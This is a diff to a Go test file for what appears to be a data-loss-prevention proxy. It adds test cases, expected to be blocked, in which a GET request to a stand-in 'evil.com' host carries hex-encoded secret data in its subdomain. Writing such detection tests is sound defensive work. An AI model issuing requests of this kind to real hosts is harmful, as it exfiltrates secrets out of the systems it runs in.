@@ -971,7 +971,9 @@ func TestAllCategoryTransportCombinations(t *testing.T) {
 		"mcp_input+mcp_stdio":        {"mcp_tool_call", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
 		"mcp_input+mcp_http":         {"mcp_tool_call", "mcp_http", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
 		"mcp_tool+mcp_stdio":         {"mcp_tool_result", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {}, "id": 1}]}`},
-		"mcp_chain+mcp_stdio":        {"mcp_tool_sequence", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
+		"mcp_chain+mcp_stdio":                {"mcp_tool_sequence", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
+		"hostname_exfiltration+fetch_proxy": {"url", "fetch_proxy", `{"method": "GET", "url": "https://7365637265743132.exfil.evil.com/"}`},
+		"hostname_exfiltration+http_proxy":  {"url", "http_proxy", `{"method": "GET", "url": "https://7365637265743132.exfil.evil.com/"}`},
 	}
 
 	for name, combo := range combos {
@@ -990,7 +992,7 @@ func TestAllCategoryTransportCombinations(t *testing.T) {
 				"expected_verdict": "block", "severity": "high",
 				"capability_tags": ["url_dlp"], "requires": [],
 				"false_positive_risk": "low", "why_expected": "test",
-				"notes": "", "source": ""
+				"notes": "", "source": "original"
 			}`, id, category, combo.inputType, combo.transport, combo.payload)
 			writeCase(t, dir, subdir, fname, caseJSON)
 			ids := make(map[string]string)
@@ -1208,6 +1210,7 @@ func categoryDir(category string) string {
 		"url": "url", "request_body": "request-body", "headers": "headers",
 		"response_fetch": "response-fetch", "response_mitm": "response-mitm",
 		"mcp_input": "mcp-input", "mcp_tool": "mcp-tool", "mcp_chain": "mcp-chain",
+		"hostname_exfiltration": "hostname-exfiltration",
 	}
 	return dirs[category]
 }
